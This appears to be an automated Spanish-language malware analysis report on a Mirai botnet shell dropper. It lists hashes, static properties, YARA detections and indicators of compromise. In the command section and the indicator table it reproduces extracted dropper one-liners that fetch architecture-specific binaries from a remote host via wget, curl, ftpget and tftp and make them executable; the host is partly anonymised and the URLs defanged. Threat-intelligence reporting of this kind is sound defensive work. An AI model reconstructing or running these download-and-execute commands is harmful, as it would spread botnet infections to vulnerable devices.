# 🧬 Payload Analysis

`86c09da1c21189d42a9de313c3399b982586f0e4116e2194bbfdd633dc31cf12`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificaron 16 comandos observados o extraídos. Se identificaron 25 indicadores técnicos. 2 detecciones YARA válidas respaldan el análisis.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Alta`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T18:44:28.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `86c09da1c21189d42a9de313c3399b982586f0e4116e2194bbfdd633dc31cf12`
- **MD5:** `6d48cb48684c5d43547900374bca3fdd`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF, LF line terminators |
| Tamaño | 2.8 KiB |
| Entropía | 4.94 |
| Strings | 26 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- YARA match: mirai

## 🖥️ Comandos observados / extraídos

```text
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/bins/phantom.x86; curl -O hxxp://91[.]92[.]4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.x8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91.92.42.XXX -c get phantom.x86;cat phantom.x86 >robben;chmo
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.x86 -g 91.92.42.XXX;cat phantom.x86 >robben;chmod
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/bins/phantom.mips; curl -O hxxp://91[.]92[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.mi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91.92.42.XXX -c get phantom.mips;cat phantom.mips >robben;ch
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.mips -g 91.92.42.XXX;cat phantom.mips >robben;chm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/bins/phantom.mpsl; curl -O hxxp://91[.]92[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.mp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91.92.42.XXX -c get phantom.mpsl;cat phantom.mpsl >robben;ch
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r phantom.mpsl -g 91.92.42.XXX;cat phantom.mpsl >robben;chm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://91.92.42.XXX/bins/phantom.arm4; curl -O hxxp://91[.]92[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.ar
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 91.92.42.XXX -c get phantom.arm4;cat phantom.arm4 >robben;ch
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.42.XXX/bins/phantom.x86;cat | strings |
| url | hxxp://91.92.42.XXX/bins/phantom.arm4;cat | strings |
| url | hxxp://91.92.42.XXX/bins/phantom.mips; | strings |
| url | hxxp://91.92.42.XXX/bins/phantom.mpsl;cat | strings |
| url | hxxp://91.92.42.XXX/bins/phantom.arm4; | strings |
| url | hxxp://91.92.42.XXX/bins/phantom.mpsl; | strings |
| url | hxxp://91.92.42.XXX/bins/phantom.mips;cat | strings |
| url | hxxp://91.92.42.XXX/bins/phantom.x86; | strings |
| ip | 91.92.42.XXX | static_analysis |
| command | cp /bin/busybox /tmp/ | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://91.92.42.XXX/bins/phantom.x86; curl -O hxxp://91[.]92[.]4 | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.x8 | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; tftp 91.92.42.XXX -c get phantom.x86;cat phantom.x86 >robben;chmo | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; tftp -r phantom.x86 -g 91.92.42.XXX;cat phantom.x86 >robben;chmod | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://91.92.42.XXX/bins/phantom.mips; curl -O hxxp://91[.]92[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.mi | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; tftp 91.92.42.XXX -c get phantom.mips;cat phantom.mips >robben;ch | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; tftp -r phantom.mips -g 91.92.42.XXX;cat phantom.mips >robben;chm | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://91.92.42.XXX/bins/phantom.mpsl; curl -O hxxp://91[.]92[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.mp | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; tftp 91.92.42.XXX -c get phantom.mpsl;cat phantom.mpsl >robben;ch | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; tftp -r phantom.mpsl -g 91.92.42.XXX;cat phantom.mpsl >robben;chm | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://91.92.42.XXX/bins/phantom.arm4; curl -O hxxp://91[.]92[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.XXX phantom.ar | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; tftp 91.92.42.XXX -c get phantom.arm4;cat phantom.arm4 >robben;ch | strings |
| hash | 86c09da1c21189d42a9de313c3399b982586f0e4116e2194bbfdd633dc31cf12 | static_analysis |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Suspicious_BusyBox_Mirai |  | medium | medium |
| Suspicious_Shell_Script |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
